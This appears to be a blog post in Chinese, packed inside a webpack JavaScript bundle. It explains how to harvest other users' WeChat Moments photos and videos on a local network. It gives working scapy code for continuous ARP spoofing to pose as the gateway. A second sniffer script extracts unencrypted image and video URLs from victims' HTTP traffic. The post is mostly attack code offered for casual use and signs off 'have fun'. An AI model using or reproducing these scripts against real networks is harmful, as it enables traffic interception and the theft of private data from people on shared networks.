webpackJsonp([18,200],{639:function(n,t){n.exports={rawContent:"\n大概源于前一阵很火的微信朋友圈红包照片。\n\n我记得那天是刚从长亭科技膜拜完离开，看到朋友圈满目的红包照片。\n\n首先是BJ Nodejs的群里有人开始晒不给红包看照片，后来这些搞计算机的同学都不给红包了。。。\n\n好多天之后，我想，干脆爬下朋友圈吧。\n\n于是有下文。\n\n## 概述\n\n目标：收割手机微信查看朋友圈时的照片\n\n手段：ARP污染，告诉局域网内所有机器我是网关\n\n## 设置系统转发\n\n确保：\n\n```bash\nreverland@localhost » cat /proc/sys/net/ipv4/ip_forward                                                                                               ~/tmp/sshjs  \n1\n```\n\n## ARP污染\n\n首先，我熟悉的scapy\n\n```python\n#! /usr/bin/python\n# -*- coding: utf-8 -*-\n# 欺骗target我是网关\n\nfrom scapy.all import *\nimport sys\nimport time\n\ntarget = sys.argv[1]\ngateway = sys.argv[2]\n# 也许不必要\n# 我只需要欺骗victim我是网关，把 请求 数据给我\n# 获取网关\n# route -n 0.0.0.0\n### 本机ip\n# ip addr show wlan0\n# myip = '192.168.1.2'\n# 获取目标MAC地址\n# 1. arp -e 192.168.1.6\n# 2. this way\n# a, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff:ff')/ARP(op=\"who-has\", psrc=myip, pdst=target),inter=RandNum(10,40), loop=0)\n# targetMac = a[0][1]['ARP'].hwsrc\n\nwhile 1:\n    send(ARP(op=\"who-has\", pdst=target, psrc=gateway))\n    time.sleep(1)\n```\n\n实际上这么一广播所有的机器都会把你当作网关。。。只要你时刻不停的污染下去。\n\n警告：可能会触发杀毒软件啥的警报\n\n## 收割图片\n\n匹配流量中图片地址就好，幸好微信消息是加密的, 只有朋友圈照片不加密。。\n\n```python\n#! /usr/bin/python\n# -*- coding: utf-8 -*-\n\nfrom scapy.all import *\n\ndef prn(x):\n    s = x['Raw'].load.split(' ')[1]\n    if s.find('/mmsns/') >= 0 and s.find('/0?tp=webp') >= 0:\n        return 'http://mmsns.qpic.cn' + s.replace('tp=webp', '')\n    elif s.find('snsvideodownload') >= 0:\n        return 'http://vweixinf.tc.qq.com' + s\n\ndef lfilter(x):\n    if x.haslayer('Raw') < 1:\n        return False\n    s = x['Raw'].load.split(' ')\n    if s[0] == 'GET':\n        return True\n    return False\n\nsniff(iface=\"wlan0\", filter=\"outbound and tcp and (port 80)\", prn=prn, store=0, lfilter=lfilter)\n```\n\nThat is all, have fun!\n\nscapy 简直杀人越货的必备。发现该项目已经从bitbucket迁移到github上了。\n\n没有做的\n\n1.  把两个部分放到两个线程里\n",metaData:{layout:"post",title:"收割朋友圈照片",excerpt:"scapy sniff",category:"security",tags:["security"],disqus:!0}}}});